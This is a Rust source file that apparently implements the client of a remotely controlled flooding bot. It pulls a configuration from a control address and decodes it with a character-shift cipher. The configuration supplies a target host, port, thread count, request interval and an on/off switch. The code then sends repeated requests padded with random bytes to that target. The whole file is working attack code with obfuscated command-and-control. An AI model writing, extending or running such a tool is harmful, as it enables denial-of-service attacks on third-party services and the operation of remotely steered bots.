use openssl::ssl::{SslConnector, SslMethod, SslStream};
use rand::{thread_rng, Rng};
use std::{
  collections::HashMap, error, io::Read, io::Result as IResult, io::Write, net::TcpStream,
};

static BODY_SEPARATOR: &str = "\r\n\r\n";
static CONFIG_SEPARATOR: &str = ";";
static CONFIG_PAIR_SEPARATOR: &str = "=";
static MAX_BUFFER_SIZE: u16 = 1024;
static CONFIG_DECRYPT_CHAR_LEFT_SHIFT: u8 = 13;

pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;

pub type ConfigMap = HashMap<String, String>;

#[derive(Debug, Clone)]
pub struct Config {
  pub headers: String,
  pub host: String,
  pub port: u16,
  pub content_length: u16,
  pub thread_count: u16,
  pub call_interval_in_ms: u64,
  pub config_fetch_interval_in_ms: u64,
  pub enabled: bool,
  pub ssl: bool,
}

impl Config {
  pub fn get_addr(&self) -> String {
    format!("{}:{}", self.host, self.port)
  }
}

impl From<ConfigMap> for Config {
  fn from(config_map: ConfigMap) -> Config {
    let conf = Config {
      headers: config_map
        .get("headers")
        .unwrap_or(&"GET / HTTP/1.1\nAccept: */*".to_string())
        .to_owned(),
      content_length: config_map
        .get("content_length")
        .unwrap_or(&"1024".to_string())
        .parse()
        .unwrap_or(1024),
      thread_count: config_map
        .get("thread_count")
        .unwrap_or(&"10".to_string())
        .parse()
        .unwrap_or(10),
      call_interval_in_ms: config_map
        .get("call_interval_in_ms")
        .unwrap_or(&"100".to_string())
        .parse()
        .unwrap_or(100),
      config_fetch_interval_in_ms: config_map
        .get("config_fetch_interval_in_ms")
        .unwrap_or(&"3600000".to_string())
        .parse()
        .unwrap_or(3600000),
      host: config_map
        .get("host")
        .unwrap_or(&"localhost".to_string())
        .to_owned(),
      port: config_map
        .get("port")
        .unwrap_or(&"80".to_string())
        .parse()
        .unwrap_or(80),
      enabled: config_map
        .get("enabled")
        .unwrap_or(&"false".to_string())
        .parse()
        .unwrap_or(false),
      ssl: config_map
        .get("ssl")
        .unwrap_or(&"false".to_string())
        .parse()
        .unwrap_or(false),
    };

    return conf;
  }
}

#[derive(Debug)]
pub struct Response {
  pub headers: String,
  pub body: String,
}

impl From<String> for Response {
  fn from(s: String) -> Response {
    let res_chunks: Vec<&str> = s.split(BODY_SEPARATOR).collect();

    Response {
      headers: res_chunks[0].to_string(),
      body: res_chunks[1].to_string(),
    }
  }
}

impl Response {
  pub fn decrypt_body(self) -> String {
    decrypt(&self.body)
  }
}

pub trait Connection {
  fn w(&mut self, buf: &[u8]) -> IResult<usize>;
  fn r(&mut self, buf: &mut String) -> IResult<usize>;
}

impl Connection for SslStream<TcpStream> {
  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
    self.write(buf)
  }

  fn r(&mut self, buf: &mut String) -> IResult<usize> {
    self.read_to_string(buf)
  }
}

impl Connection for TcpStream {
  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
    self.write(buf)
  }

  fn r(&mut self, buf: &mut String) -> IResult<usize> {
    self.read_to_string(buf)
  }
}

pub fn create_stream(conf: &Config) -> Box<dyn Connection> {
  if conf.ssl {
    let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();

    let stream = TcpStream::connect(conf.get_addr()).unwrap();
    Box::new(connector.connect(&conf.host, stream).unwrap())
  } else {
    let stream = TcpStream::connect(conf.get_addr()).unwrap();

    Box::new(stream)
  }
}

pub fn parse_config(s: &str) -> ConfigMap {
  let parsed: ConfigMap = s
    .split(CONFIG_SEPARATOR)
    .map(|line: &str| line.split(CONFIG_PAIR_SEPARATOR).collect())
    .collect::<Vec<Vec<&str>>>()
    .iter()
    .fold(HashMap::<String, String>::new(), |mut conf, pair| {
      if pair.len() == 2 {
        conf.insert(pair[0].trim().to_string(), pair[1].trim().to_string());
      };
      return conf;
    });

  return parsed;
}

pub fn get_conf(addr: &str) -> Result<Config> {
  let headers = String::from("GET / HTTP/1.1\nAccept: */*") + BODY_SEPARATOR;
  let mut res = String::new();
  let mut stream = TcpStream::connect(addr)?;

  stream.write(&headers.as_bytes())?;
  stream.read_to_string(&mut res)?;

  let res: Response = Response::from(res);

  let conf = parse_config(&res.decrypt_body());
  let conf = Config::from(conf);

  println!("Done fetching config {:?}.", conf);

  Ok(conf)
}

pub fn call(conf: &Config) -> Result<Response> {
  let mut stream = create_stream(&conf);
  let mut rng = thread_rng();
  let body: Vec<u8> = vec![0; conf.content_length as usize]
    .iter()
    .map(|_| rng.gen::<u8>())
    .collect();
  let mut res = String::new();

  stream.w(conf.headers.as_bytes())?;
  stream.w("\n\n".as_bytes())?;

  if conf.content_length > MAX_BUFFER_SIZE {
    for chunk in body.chunks(MAX_BUFFER_SIZE as usize) {
      stream.w(&chunk)?;
    }
  } else {
    stream.w(&body)?;
  }

  stream.w(&[0; 1])?;
  stream.r(&mut res)?;

  println!("Done calling {}...", conf.get_addr());

  return Ok(Response::from(res));
}

pub fn decrypt(s: &str) -> String {
  return s.chars().map(|c| (c as u8 - CONFIG_DECRYPT_CHAR_LEFT_SHIFT as u8) as char).collect::<String>();
}